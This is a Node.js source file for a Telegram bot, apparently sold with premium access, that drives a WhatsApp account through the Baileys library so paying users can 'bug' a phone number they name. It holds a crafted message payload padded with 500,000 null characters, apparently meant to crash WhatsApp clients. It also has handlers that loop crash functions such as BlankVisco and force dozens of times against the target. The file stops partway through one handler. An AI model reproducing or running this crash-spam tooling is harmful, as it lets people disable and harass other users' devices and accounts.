// CREDIT SARAH 
// BOT YANG DI GUNANKAN WAJIB DI ADMINKAN DI CHANEL/GB YANG DI ARAHKAN.. 
// KLO GK MAU DEL AJA CODE NYA
const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const path = require('path');
const axios = require('axios');
const moment = require('moment-timezone');
const { BOT_TOKEN, allowedDevelopers } = require("./config");
const tdxlol = fs.readFileSync('./tdx.jpeg');
const crypto = require('crypto');
const userHasRunTes = new Map();
const cooldownUsers = new Map();
const o = fs.readFileSync(`./o.jpg`)
// --- Inisialisasi Bot Telegram ---
const bot = new Telegraf(BOT_TOKEN);

// --- Variabel Global ---
const log = (message, error = null) => {
}
let zephy = null;
let isWhatsAppConnected = false;
const usePairingCode = true; 
let maintenanceConfig = {
    maintenance_mode: false,
    message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
// --- Fungsi-fungsi Bantuan ---
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// --- Fungsi untuk Mengecek Apakah User adalah Owner ---
const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "✅";
        return true;
    } else {
        ownerataubukan = "❌";
        return false;
    }
};

const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "✅";
        return true;
    } else {
        adminataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
    fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
};

// --- Fungsi untuk Mencatat Aktivitas Pengguna ---
const recordUserActivity = (userId, userNickname) => {
    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
    userActivity[userId] = {
        nickname: userNickname,
        last_seen: now
    };

    // Menyimpan aktivitas pengguna ke file
    fs.writeFileSync('./userActivity.json', JSON.stringify(userActivity));
};

// --- Fungsi untuk Memuat Aktivitas Pengguna ---
const loadUserActivity = () => {
    try {
        const data = fs.readFileSync('./userActivity.json');
        userActivity = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
        userActivity = {};
    }
};

// --- Middleware untuk Mengecek Mode Maintenance ---
const checkMaintenance = async (ctx, next) => {
    let userId, userNickname;

    if (ctx.from) {
        userId = ctx.from.id.toString();
        userNickname = ctx.from.first_name || userId;
    } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
        userId = ctx.update.channel_post.sender_chat.id.toString();
        userNickname = ctx.update.channel_post.sender_chat.title || userId;
    }

    // Catat aktivitas hanya jika userId tersedia
    if (userId) {
        recordUserActivity(userId, userNickname);
    }

    if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
        // Jika mode maintenance aktif DAN user bukan developer:
        // Kirim pesan maintenance dan hentikan eksekusi middleware
        console.log("Pesan Maintenance:", maintenanceConfig.message);
        const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); // Escape karakter khusus
        return await ctx.replyWithMarkdown(escapedMessage);
    } else {
        // Jika mode maintenance tidak aktif ATAU user adalah developer:
        // Lanjutkan ke middleware/handler selanjutnya
        await next();
    }
};

// --- Middleware untuk Mengecek Status Premium ---
const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ Maaf, Anda bukan user premium. Silakan hubungi developer @fathirsthore untuk upgrade.");
    }
};

async function saveOwnerList() {
    const ownerFilePath = path.resolve(__dirname, 'owner.json');
    fs.writeFileSync(ownerFilePath, JSON.stringify(ownerList, null, 2));
}

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    zephy = makeWASocket(connectionOptions);

    zephy.ev.on('creds.update', saveCreds);
    store.bind(zephy.ev);

    zephy.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃   ${chalk.green.bold('WHATSAPP CONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃   ${chalk.red.bold('WHATSAPP DISCONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`),
                shouldReconnect ? chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃   ${chalk.red.bold('RECONNECTING AGAIN')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}

(async () => {
    console.log(chalk.whiteBright.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.yellowBright.bold('SYSTEM ANTI CRACK ACTIVE')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));

    console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.yellow.bold('SUKSES MEMUAT DATABASE OWNER')}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━❍`));

    loadPremiumUsers();
    loadAdmins();
    
    loadUserActivity();
    
    startSesi();

    // Menambahkan device ke ListDevice.json saat inisialisasi
    addDeviceToList(BOT_TOKEN, BOT_TOKEN);
})();
// --- Command Handler ---

// Fungsi untuk memeriksa keanggotaan channel
async function checkChannelMembership(ctx) {
    const channelId = "@aboutxin"; // ID channel
    try {
        const chatMember = await ctx.telegram.getChatMember(channelId, ctx.from.id);
        return ["member", "administrator", "creator"].includes(chatMember.status);
    } catch (error) {
        log("Gagal memeriksa keanggotaan channel", error);
        return false;
    }
}


// Command untuk pairing WhatsApp
bot.command("addpairing", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addpairing <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

    if (!phoneNumber.startsWith('62')) {
        return await ctx.reply("❌ Nomor harus diawali dengan 62. Contoh: /addpairing 628xxxxxxxxxx");
    }

    if (zephy && zephy.user) {
        return await ctx.reply("ℹ️ WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await zephy.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
*✅ Pairing Code WhatsApp:*

*Nomor:* ${phoneNumber}
*Kode:* ${formattedCode}
        `;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Command /addowner - Menambahkan owner baru
bot.command("addowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addowner <id_user>");
    }

    if (ownerList.includes(userId)) {
        return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
    }

    ownerList.push(userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner baru sekarang memiliki akses ke perintah /addadmin, /addprem, dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /delowner - Menghapus owner
bot.command("delowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delowner <id_user>");
    }

    if (!ownerList.includes(userId)) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
    }

    ownerList = ownerList.filter(id => id !== userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner tersebut tidak lagi memiliki akses seperti owner.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /addadmin - Menambahkan admin baru
bot.command("addadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addadmin <id_user>");
    }

    addAdmin(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin baru sekarang memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});

// Command /deladmin - Menghapus admin
bot.command("deladmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /deladmin <id_user>");
    }

    removeAdmin(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin tersebut tidak lagi memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});

// Callback Query untuk Menampilkan Daftar Admin
bot.action("listadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Maaf, Anda tidak memiliki akses untuk melihat daftar admin.");
    }

    const adminListString = adminList.length > 0
        ? adminList.map(id => `- ${id}`).join("\n")
        : "Tidak ada admin yang terdaftar.";

    const message = `
ℹ️ Daftar Admin:

${adminListString}

Total: ${adminList.length} admin.
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// Command /addprem - Menambahkan user premium
bot.command("addprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addprem <id_user> <durasi_hari>");
    }

    const userId = args[1];
    const durationDays = parseInt(args[2]);

    if (isNaN(durationDays) || durationDays <= 0) {
        return await ctx.reply("❌ Durasi hari harus berupa angka positif.");
    }

    addPremiumUser(userId, durationDays);

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Premium User*.

*Detail:*
- *ID User:* ${userId}
- *Durasi:* ${durationDays} hari
- *Kadaluarsa:* ${formattedExpiration} WIB

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Cek Status Premium", callback_data: `cekprem_${userId}` }]
            ]
        }
    });
});

// Command /delprem - Menghapus user premium
bot.command("delprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delprem <id_user>");
    }

    if (!premiumUsers[userId]) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    removePremiumUser(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Premium User*.

*Detail:*
- *ID User:* ${userId}

User tersebut tidak lagi memiliki akses ke fitur premium.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Callback Query untuk Menampilkan Status Premium
bot.action(/cekprem_(.+)/, async (ctx) => {
    const userId = ctx.match[1];
    if (userId !== ctx.from.id.toString() && !OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Anda tidak memiliki akses untuk mengecek status premium user lain.");
    }

    if (!premiumUsers[userId]) {
        return await ctx.answerCbQuery(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
    const timeLeft = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').fromNow();

    const message = `
ℹ️ Status Premium User *${userId}*

*Detail:*
- *ID User:* ${userId}
- *Kadaluarsa:* ${formattedExpiration} WIB
- *Sisa Waktu:* ${timeLeft}

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// --- Command /cekusersc ---
bot.command("cekusersc", async (ctx) => {
    const totalDevices = deviceList.length;
    const deviceMessage = `
ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
    `;

    await ctx.replyWithMarkdown(deviceMessage);
});

// --- Command /monitoruser ---
bot.command("monitoruser", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    let userList = "";
    for (const userId in userActivity) {
        const user = userActivity[userId];
        userList += `
- *ID:* ${userId}
 *Nickname:* ${user.nickname}
 *Terakhir Dilihat:* ${user.last_seen}
`;
    }

    const message = `
👤 *Daftar Pengguna Bot:*
${userList}
Total Pengguna: ${Object.keys(userActivity).length}
    `;

    await ctx.replyWithMarkdown(message);
});

// --- Contoh Command dan Middleware ---
const prosesrespone = async (target, ctx) => {
    const caption = `Process...`;

    await ctx.reply(caption)
        .then(() => {
            console.log('Proses response sent');
        })
        .catch((error) => {
            console.error('Error sending process response:', error);
        });
};

const donerespone = async (target, ctx) => {
    const caption = `Succesfully`;

    await ctx.reply(caption)
        .then(() => {
            console.log('Done response sent');
        })
        .catch((error) => {
            console.error('Error sending done response:', error);
        });
};

const checkWhatsAppConnection = async (ctx, next) => {
    if (!isWhatsAppConnected) {
        await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing");
        return;
    }
    await next();
};

const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};

bot.use(checkMaintenance); // Middleware untuk mengecek maintenance

// --- Command /show (Placeholder for your actual crash functions) ---

bot.command("cd", async (ctx) => {
  const userId = ctx.from.id;

  if (!cooldownUsers.has(userId)) {
    return await ctx.reply("Tidak ada cooldown aktif untuk Anda. Anda dapat menggunakan perintah sekarang.");
  }

  const remainingTime = Math.ceil((cooldownUsers.get(userId) - Date.now()) / 1000);

  if (remainingTime > 0) {
    return await ctx.reply(`Cooldown aktif. Harap tunggu ${remainingTime} detik sebelum menggunakan perintah lagi.`);
  } else {
    cooldownUsers.delete(userId);
    return await ctx.reply("Cooldown Anda sudah selesai. Anda dapat menggunakan perintah sekarang.");
  }
});

bot.command("xbug", checkWhatsAppConnection, checkPremium, async ctx => {
  const userId = ctx.from.id;

  if (cooldownUsers.has(userId)) {
    const remainingTime = Math.ceil((cooldownUsers.get(userId) - Date.now()) / 1000);
    return await ctx.reply(`Harap tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
  }

  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /xbug 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  userHasRunTes.set(userId, target);

  const buttons = [
    [
      { text: "ᄓ̻𝐗̻͠𝐈⍣𝐕͜𝐈͠𝐗͢𝐈͡𝐁͜𝐋͠𝐄", callback_data: `invis_${target}` },
      { text: "ᄓ̻𝐗̻͠𝐈⍣𝐗̻͡𝐀͢⍣𝐕͜𝐄͠𝐑͢𝐈𝐔͠𝐒", callback_data: `invis2_${target}` }, 
    ], 
    [
      { text: "ᄓ̻𝐗̻͠𝐈⍣𝐁͢𝐃͡𝐎͜𝐙͠𝐄͜𝐑", callback_data: `invis3_${target}` },
      { text: "ᄓ̻𝐗̻͠𝐈⍣̻𝐔͠𝐋͢𝐓𝐈͜͠𝐌͡𝐀͢𝐓͠𝐄", callback_data: `invis4_${target}` }, 
     ], 
     [
     { text: "ᄓ̻𝐗̻͠𝐈⍣𝐂͒͢𝐑͡𝐀͜𝐒͠𝐇͢𝐗", callback_data: `invisnoclik_${target}` }, 
     { text: "ᄓ̻𝐗̻͠𝐈⍣𝐓͜𝐑͡𝐀͢𝐒͠𝐇", callback_data: `trash_${target}` },
    ], 
    [
      { text: "ᄓ̻𝐗̻͠𝐈⍣̻𝐓͜𝐑͡𝐀͢𝐒͡𝐇͜𝐔͠𝐈 ", callback_data: `core_${target}` }, 
      { text: "ᄓ̻⍣𝐗̻͠𝐈⍣𝐇͢𝐀͠𝐑͕𝐃͢͡𝐔𝐈", callback_data: `hardui_${target}` }, 
    ], 
    [
      { text: "ᄓ̻𝐗̻͠𝐈⍣𝐓͜𝐑͡𝐀͜𝐒͠𝐇͢𝐈𝐎͡𝐒", callback_data: `iosx_${target}` }, 
      { text: "ᄓ̻𝐗̻͠𝐈⍣𝐂͒͢𝐑͡𝐀͜𝐒͠𝐇͢𝐗𝐈͠𝐎͜𝐒͡", callback_data: `xis_${target}` }, 
    ], 
    [
      { text: "続ける", url: `https://t.me/fathirsthore` }
    ]
  ];

  const loadingImageUrl = "https://files.catbox.moe/ci9isa.jpg";

  await ctx.replyWithPhoto(loadingImageUrl, {
    caption: `Click One Of The Buttons To Select The Bug Option ${q}`,
    reply_markup: {
      inline_keyboard: buttons
    }
  });

  const cooldownDuration = 60000;
  cooldownUsers.set(userId, Date.now() + cooldownDuration);

  setTimeout(() => {
    cooldownUsers.delete(userId);
  }, cooldownDuration);
});

//==========FUNC ANDRO===========\\
bot.action(/trash_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /xbug terlebih dahulu.", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆");
  
  const ImageUrl = "https://files.catbox.moe/rf8qar.jpg";
  
  try {
    await ctx.editMessageCaption("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆", {
      photo: ImageUrl,
    });
        for (let i = 0; i < 25; i++) {
        await BlankVisco(target)
        await new Promise((resolve) => setTimeout(resolve, 1000)); 
        await force(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        await force(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));   
        await BlankVisco(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        }
    

    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`
<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒
𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}.
𝐓𝐘𝐏𝐄 : 𝐓𝐑𝐀𝐒𝐇`, {
      photo: ImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "戻る", url: "https://t.me/fathirsthore" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: ImageUrl,
    });
  }
});


bot.action(/core_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /xbug terlebih dahulu.", { show_alert: true });
    return;
  }

  await ctx.answerCbQuery("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆");
  
  const ImageUrl = "https://files.catbox.moe/rf8qar.jpg";
  
  try {
    await ctx.editMessageCaption("<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢𝐏͢𝐑͡𝐎͜͡𝐂𝐄͠𝐒𝐈͢𝐍͠𝐆", {
      photo: ImageUrl,
    });
        for (let i = 0; i < 40; i++) {
        await blank(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));   
        await BlankVisco(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        await force(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        await BlankVisco(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        await blank(target)
        await new Promise((resolve) => setTimeout(resolve, 1000));
        }
    

    userHasRunTes.delete(ctx.from.id);

    return await ctx.editMessageCaption(`
<🝰 ᯭ𝐀͢𝐓ᯭ𝐓͢͠𝐀𝐂𝐊ᬺ𝐈𝐍𝐆᭭͢ 𝐒𝐔͢͠𝐂𝐂͢ᯭ𝐄𝐒
𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}.
𝐓𝐘𝐏𝐄 : 𝐓𝐑𝐀𝐒𝐇 𝐔𝐈`, {
      photo: ImageUrl,
      reply_markup: {
        inline_keyboard: [
          [
            { text: "戻る", url: "https://t.me/fathirsthore" }
          ]
        ]
      }
    });
  } catch (error) {
    console.error("Terjadi kesalahan saat mengirim bug:", error);
    await ctx.editMessageCaption("Terjadi kesalahan saat mengirim bug. Coba lagi.", {
      photo: ImageUrl,
    });
  }
});

bot.action(/hardui_(.+)/, async (ctx) => {
  const target = ctx.match[1];

  if (!userHasRunTes.has(ctx.from.id) || userHasRunTes.get(ctx.from.id) !== target) {
    await ctx.answerCbQuery("Anda harus menjalankan perintah /xbug terlebih dahulu.", { show_alert: true });
    return;
  }

